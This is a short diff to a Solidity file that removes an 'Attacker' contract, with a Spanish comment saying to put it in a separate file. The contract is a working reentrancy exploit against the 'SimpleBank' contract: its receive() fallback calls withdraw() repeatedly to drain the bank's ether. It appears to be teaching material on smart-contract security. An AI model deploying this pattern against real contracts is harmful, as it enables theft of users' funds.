@@ -27,27 +27,3 @@ contract SimpleBank {
     }
 
 }
-
-
-/**
- * Ponerlo en un fichero separado. 
- */
-contract Attacker {
-    SimpleBank simpleBank;
-
-    constructor(address _simpleBankAddress) {
-        simpleBank = SimpleBank(_simpleBankAddress);
-    }
-
-    function attack() external payable {
-        simpleBank.deposit{value: msg.value}();
-        simpleBank.withdraw();
-    }
-
-    receive() external payable {
-        if(address(simpleBank).balance >= 1 ether) {
-            simpleBank.withdraw();
-        }
-    }
-
-}
